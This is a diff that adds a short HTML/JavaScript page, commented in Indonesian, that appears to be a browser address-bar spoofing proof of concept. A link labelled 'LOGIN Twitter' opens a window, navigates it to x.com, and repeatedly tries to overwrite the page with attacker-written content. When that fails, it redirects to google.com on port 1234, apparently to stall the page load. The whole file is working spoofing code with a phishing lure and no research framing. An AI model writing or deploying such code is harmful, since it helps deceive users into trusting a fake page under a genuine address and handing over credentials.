@@ -1,0 +1,32 @@
+<script>
+  function next() {
+    // Redirect ke halaman Google setelah pengalihan
+    w.location.replace('https://www.google.com:1234');
+  }
+
+  function f() {
+    // Membuka jendela baru
+    w = window.open("");  
+    w.document.write('<h2>This is not x.com!</h2>');  // Tampilkan konten sementara
+    
+    // Mengubah alamat URL ke x.com, address bar berubah
+    w.location = "https://x.com";
+
+    // Menjaga proses load tetap aktif, dan memeriksa lokasi URL
+    i = setInterval(function() {
+      try {
+        // Cek apakah sudah berhasil di redirect ke x.com
+        if (w.location.href === "https://x.com") {
+          // Lanjutkan setelah berhasil, tetapi tetap di x.com
+          w.document.body.innerHTML = "<h2>This is not x.com!</h2>";
+        }
+      } catch (e) {
+        // Jika gagal, redirect ke https://www.google.com:1234
+        clearInterval(i);
+        next();
+      }
+    }, 1);  // Mengecek setiap 1ms
+  }
+</script>
+
+<a href="#" onclick="f()">LOGIN Twitter</a>
